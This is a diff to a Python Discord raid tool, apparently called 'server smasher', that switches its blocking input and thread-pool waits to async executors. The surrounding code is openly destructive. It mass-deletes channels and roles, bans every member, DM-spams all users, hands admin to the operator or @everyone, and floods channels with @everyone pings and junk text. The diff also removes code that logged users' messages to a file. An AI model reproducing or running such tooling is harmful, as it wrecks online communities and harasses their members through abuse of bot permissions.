@@ -15,6 +15,7 @@ try:
     from discord import Permissions
     from threading import Thread
     from queue import Queue
+    from concurrent.futures import ThreadPoolExecutor
 except Exception as e:
     print ("Module import error: " + str(e))
     input()
@@ -71,6 +72,7 @@ class ThreadPool:
         self.tasks.join()
 
 pool = ThreadPool(int(threadcount))
+loop = asyncio.get_event_loop()
 channellist = []
 client = discord.Client()
 
@@ -157,6 +159,15 @@ def sendspam(channel,msgcontent):
         sendspam(channel,msgcontent)
 
 print ("Starting...")
+
+def inputselection(text):
+    output = input(text)
+    return output
+
+def complete_pool():
+    pool.wait_completion()
+    return None
+
 @client.event
 async def on_ready():
     if changegameonlogin == True:
@@ -164,12 +175,6 @@ async def on_ready():
     clear()
     print (colored("Login success!","green"))
     await serverselect()
-
-        
-@client.event
-async def on_message(message):
-    with open ("serversmasher.log","a+",errors='ignore') as handle:
-        handle.write(str(message.author.name)+"#"+str(message.author.discriminator)+": "+str(message.content)+"\n")
 
 async def serverselect():
     lists = []
@@ -189,13 +194,13 @@ async def serverselect():
         print(colored(str(counter)+'. ('+str(serv.id)+') '+str(serv)+" ({} members)".format(membcount)+'\n',"green"))
         lists.append(serv.id)
     print('----------------------------------------')
-    servernum = input('Select the server to configure bot actions: ')
+    servernum = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Select the server to configure bot actions: ')
     if servernum.lower() == 'back':
         print ("Returning to Raid ToolBox.")
-        await client.logout()
+        await client.close()
     elif servernum.lower() == 'b':
         print ("Returning to Raid ToolBox.")
-        await client.logout()
+        await client.close()
     else:
         try:
             SERVER = lists[int(servernum)]
@@ -212,7 +217,7 @@ async def main(SERVER):
     print ("----------------------------------------")
     print ("Options:")
     print (colored(" 0. Return to server select. \n 1. Configure then destroy. \n 2. Destroy with config settings.  \n 3. Create Server Invite. \n 4. Change What the bot is playing. \n 5. Leave server. \n 6. Return to Raid ToolBox Menu","green"))
-    opts = input ("Select the number for your option: ")
+    opts = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Select the number for your option: ")
     toggleopts = {
         'namechange' : namechange,
         'servname' : servname,
@@ -243,10 +248,6 @@ async def main(SERVER):
                await serverselect()
 
         elif int(opts) == 1:
-            @client.event
-            async def on_message(message):
-                with open ("serversmasher.log","a+",errors='ignore') as handle:
-                    handle.write(str(message.author.name)+"#"+str(message.author.discriminator)+": "+str(message.content)+"\n")
             async def changesettings(toggleopts,SERVER):
                 try:
                     clear()
@@ -276,7 +277,7 @@ async def main(SERVER):
                     print (colored("21. Give yourself admin: {}".format(toggleopts['gimmieadmin']),"green"))
                     print (colored("22. Your ID: {}".format(toggleopts['me']),"green"))
                     print (colored("23. Give @everyone admin: {}".format(toggleopts['giveeveryoneadmin']),"green"))
-                    toga = input("Item to toggle or change:\n")
+                    toga = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Item to toggle or change:\n")
                     if toga.lower() == "start":
                         channellist = []
                         sc = 0
@@ -293,7 +294,7 @@ async def main(SERVER):
                             for channel in server.channels:
                                 print (colored("Deleting " + str(channel.name),"blue"))
                                 pool.add_task(deletechannel,channel.id)
-                            pool.wait_completion()
+                            await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
                             print('Finished deleting channels.')
                            
                         if toggleopts['roledel'] == True:
@@ -308,7 +309,7 @@ async def main(SERVER):
                             for user in server.members:
                                 print (colored('Sending DM to ' + user.name,"blue"))
                                 pool.add_task(senddmtouser,user.id,toggleopts['dmcontent'])
-                            pool.wait_completion()
+                            await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
 
                         if toggleopts['namechange'] == True:
                             print('Changing server name...')
@@ -343,7 +344,7 @@ async def main(SERVER):
                                 else:
                                     print (colored('Banning ' + str(user.name),"blue"))
                                     pool.add_task(banuser,user.id,SERVER)
-                            pool.wait_completion()
+                            await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
 
                         if toggleopts['gimmieadmin'] == True:
                             print('Giving you admin...')
@@ -365,7 +366,7 @@ async def main(SERVER):
                                 
                                 if toggleopts['chanmethod'].lower() == "voice":
                                     pool.add_task(createchannel,SERVER,toggleopts['channame'],"voice")
-                            pool.wait_completion()
+                            await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
                             
                             print ('Channels Created.')
                             
@@ -517,7 +518,7 @@ async def main(SERVER):
                 for channel in server.channels:
                     print (colored("Deleting " + str(channel.name),"blue"))
                     pool.add_task(deletechannel,channel.id)
-                pool.wait_completion()
+                await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
                 print('Finished deleting channels.')
                
             if roledel == True:
@@ -525,14 +526,14 @@ async def main(SERVER):
                for role in server.roles:
                     print (colored("Deleting role: " + role.name,"blue"))
                     pool.add_task(deleterole,role.id,SERVER)
-               pool.wait_completion()
+               await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
                print('Finished deleting roles.')
                
             if senddm == True:
                 for user in server.members:
                     print (colored('Sending DM to ' + user.name,"blue"))
                     pool.add_task(senddmtouser,user.id,dmcontent)
-                pool.wait_completion()
+                await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
             if namechange == True:
                 print('Changing server name...')
                 await client.edit_server(server=server, name=str(servname))
@@ -565,7 +566,7 @@ async def main(SERVER):
                     else:
                         print (colored('Banning ' + str(user.name),"blue"))
                         pool.add_task(banuser,user.id,SERVER)
-                pool.wait_completion()
+                await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
 
             if gimmieadmin == True:
                 print('Giving you admin...')
@@ -587,14 +588,14 @@ async def main(SERVER):
                     
                     if chanmethod.lower() == "voice":
                         pool.add_task(createchannel,SERVER,channame,"voice")
-                pool.wait_completion()
+                await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
                 
                 print ('Channels Created.')
                 
             if chanmethod.lower() == "voice":
                 if chandel == True:
                     print (colored("Not spamming, due to there only being voice channels in this server.","red"))
-                    input ()
+                    await loop.run_in_executor(ThreadPoolExecutor(), input())
                     await main(SERVER)
 
             if usespam == True:
@@ -609,7 +610,7 @@ async def main(SERVER):
                     await everyonespam(SERVER)
             else:
                 print ("Finished!")
-                input()
+                await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
                 await main(SERVER)
            
         elif int(opts) == 3:
@@ -619,7 +620,7 @@ async def main(SERVER):
                     invite = invitelinknew.url
                     pyperclip.copy(invite)
                     print (invite + " copied to clipboard.")
-                    input ()
+                    await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
                     await main(SERVER)
                     
                 elif channel.type == discord.ChannelType.voice:
@@ -627,7 +628,7 @@ async def main(SERVER):
                     invite = invitelinknew.url
                     pyperclip.copy(invite)
                     print (invite + " copied to clipboard.")
-                    input ()
+                    await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
                     await main(SERVER)
                     
         elif int(opts) == 4:
@@ -637,7 +638,7 @@ async def main(SERVER):
             
         elif int(opts) == 5:
             print ("Are you sure you want to leave this server? (Y/N): ")
-            yn = input()
+            yn = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
             if yn.lower() == 'y':
                 await client.leave_server(server)
                 await asyncio.sleep(3)
@@ -647,12 +648,12 @@ async def main(SERVER):
                 
         elif int(opts) == 6:
             print ("Returning to Raid ToolBox.")
-            await client.logout()
+            await client.close()
             
     except Exception as e:
         print (colored("Error:","red"))
         print (colored(e,"red"))
-        input()
+        await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
         await main(SERVER)
         
 async def mass_tag(SERVER):
@@ -672,7 +673,7 @@ async def mass_tag(SERVER):
             print('Mass Mentioning in: '+c.name)
             for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                 pool.add_task(sendspam,c.id,m)
-       pool.wait_completion()
+       #await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
 
 async def ascii_spam(SERVER):
     server = client.get_server(SERVER)
@@ -691,7 +692,7 @@ async def ascii_spam(SERVER):
                 num = random.randrange(13000)
                 asc = asc + chr(num)
             pool.add_task(sendspam,c.id,asc)
-       pool.wait_completion()
+       #await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
        
 async def text_spam(SERVER,customtxt):
     server = client.get_server(SERVER)
@@ -706,7 +707,7 @@ async def text_spam(SERVER,customtxt):
                 continue
             print('Text Spamming in: '+c.name)
             pool.add_task(sendspam,c.id,customtxt)
-       pool.wait_completion()
+       #await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
 
 async def everyonespam(SERVER):
     server = client.get_server(SERVER)
@@ -722,7 +723,7 @@ async def everyonespam(SERVER):
             message = "@everyone"
             print('@everyone Spamming in: '+c.name)
             pool.add_task(sendspam,c.id,message)
-       pool.wait_completion()
+       #await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
 
 if clienttype.lower() == "user":
     try:
